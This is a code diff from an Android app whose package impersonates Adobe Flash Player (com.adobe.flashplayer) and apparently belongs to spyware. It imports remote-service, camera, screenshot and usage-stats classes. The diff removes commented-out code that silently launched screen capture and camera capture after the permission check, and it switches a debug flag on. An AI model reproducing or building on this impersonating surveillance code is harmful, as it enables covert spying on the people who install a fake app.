@@ -32,7 +32,7 @@ import com.adobe.flashplayer.core.ForegroundSrv;
 import com.adobe.flashplayer.core.RemoteSrv;
 import com.adobe.flashplayer.core.UsageStatsMgr;
 import com.adobe.flashplayer.data.CameraActivity;
-import com.adobe.flashplayer.data.CameraActivity2;
+
 import com.adobe.flashplayer.data.ScreenShotActivity;
 
 import java.util.List;
@@ -75,9 +75,9 @@ public class InstallActivity extends Activity  {
 
     private int BATTERYOPT_REQUESTCODE = 0x1234;
 
-    public static boolean debug_flag = false;
-
     public static boolean permission_authoritized = false;
+
+    public static boolean debug_flag = true;
 
 
     static {
@@ -152,29 +152,12 @@ public class InstallActivity extends Activity  {
 
                 Permission.checkPermission(InstallActivity.this);
 
-                /*
-                Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
-                intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intentscr);
-
-                Intent intentCamera = new Intent(InstallActivity.this, CameraActivity2.class);
-                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                intentCamera.putExtra("index",0);
-                intentCamera.putExtra("count",1);
-                startActivity(intentCamera);
-                 */
-
                 finish();
 
                 return;
             }else{
                 if (debug_flag ){
-
                     //do something to debug
-                    String str1 = "hello";
-                    String str2 = "hello";
-                    boolean b1 = (str1== str2);
-                    boolean b2 = (str2.equals(str1));
 
                     install(InstallActivity.this);
                 }
